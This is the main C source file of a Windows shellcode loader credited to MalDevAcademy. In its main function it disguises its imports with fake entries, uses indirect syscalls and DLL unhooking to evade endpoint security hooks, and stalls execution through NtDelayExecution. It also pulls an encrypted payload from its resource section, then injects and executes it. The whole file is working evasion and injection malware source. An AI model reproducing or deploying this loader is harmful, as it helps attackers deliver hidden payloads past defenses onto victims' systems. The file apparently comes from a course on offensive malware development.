// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <shlobj.h>

#include "Structs.h"
#include "Common.h"
#include "Resource.h"
#include "FunctionPntrs.h"
#include "IatCamo.h"
#include "Debug.h"

#pragma comment (lib, "shell32.lib")

/*
NOTE:
	* To enable debug mode, uncomment line 5 in the 'Debug.h' file.
	* To delay execution before dll unhooking, uncomment line 9 in the 'Common.h' file
*/


//------------------------------------------------------------------------------------------------------------
NT_API		g_Nt				= { 0 };			// Found in Unhook.c and Inject.c as an 'extern' variable
FLOAT		g_NT_DELAY_TIME			= 0.2;				// Delay execution for 0.2 minute
FLOAT		_fltused			= 0.0;				// Used for the compiler (this variable is located in the CRT library, thus its manually defined) 
//------------------------------------------------------------------------------------------------------------


// Function that loads 'shell32.dll' (IAT) that will load 'win32u.dll'.
// 'win32u.dll' contains GUI-related syscalls that will be used in implementing indirect syscalls
VOID AddWin32uToIat() {
	
	WCHAR szPath[MAX_PATH] = { 0 };
	SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
}


VOID DelayExecution(IN FLOAT fMinutes) {

	NTSTATUS		STATUS		= 0x00;
	DWORD			dwMilliSeconds	= fMinutes * 60000;				// Converting minutes to milliseconds  
	LONGLONG            	Delay		= dwMilliSeconds * 10000;			// Converting from milliseconds to the 100-nanosecond negative time interval
	LARGE_INTEGER       	DelayInterval	= { .QuadPart = (-1 * Delay) };

	SET_SYSCALL(g_Nt.NtDelayExecution);
	if (!NT_SUCCESS(STATUS = RunSyscall(FALSE, &DelayInterval)) && STATUS != STATUS_TIMEOUT) {
#ifdef DEBUG
		PRINT("[!] NtDelayExecution Failed With Error: 0x%0.8X - %s.%d \n", STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
	}

}

int main() {


	PBYTE	pRsrcPayloadBuffer	= NULL,
		pInjectedPayload	= NULL;
	DWORD	dwRsrcPayloadSize	= 0x00;


#ifdef DEBUG
	CreateDebugConsole();
#endif // DEBUG


	// Add fake imports to the IAT
	IatCamouflage();
	
	// Force win32u.dll to be loaded
	AddWin32uToIat();

	// Initialize indirect syscalls structure
	if (!InitIndirectSyscalls(&g_Nt)) {
#ifdef DEBUG
		goto _DEBUG_END;
#endif 
		return -1;
	}
	
	// Fetch payload from the resource section
	if (!GetResourcePayload(GetModuleHandleH(NULL), CTAES_PAYLOAD_ID, &pRsrcPayloadBuffer, &dwRsrcPayloadSize)) {
#ifdef DEBUG
		PRINT("[!] Failed To Fetch The Payload From The Resource Section - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
		goto _DEBUG_END;
#endif 
		return -1;
	}

#ifdef DELAY
#ifdef DEBUG
	PRINT("[i] Delaying Execution For %d Seconds ... ", (DWORD)(g_NT_DELAY_TIME * 60));
#endif 
	DelayExecution(g_NT_DELAY_TIME);
#ifdef DEBUG
	PRINT("[+] DONE \n");
#endif 
#endif // DELAY

	// Dll unhooking 
	UnhookAllLoadedDlls();

	// Injecting the payload
	if (!InjectEncryptedPayload(pRsrcPayloadBuffer, dwRsrcPayloadSize, &pInjectedPayload)) {
#ifdef DEBUG
		PRINT("[!] Failed To Inject The Payload - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
		goto _DEBUG_END;
#endif 
		return -1;
	}

#ifdef DEBUG
	PRINT("\n\t\t[*]========> Executing The Payload In %d Seconds <========[*]\n", PAYLOAD_EXEC_DELAY);
#endif 

	// Executing the payload
	ExecutePayload(pInjectedPayload);

	return 0;

#ifdef DEBUG
_DEBUG_END:
	switch (MessageBoxA(NULL, "Free Debug Console ?", "Loader.exe", MB_OKCANCEL | MB_ICONQUESTION)) {
		case IDOK: {
			FreeConsole();
			break;
		}
		case IDCANCEL: {
			Sleep(-1);
			break;
		}
		default: {
			break;
		}
	}
	return -1;
#endif 
}
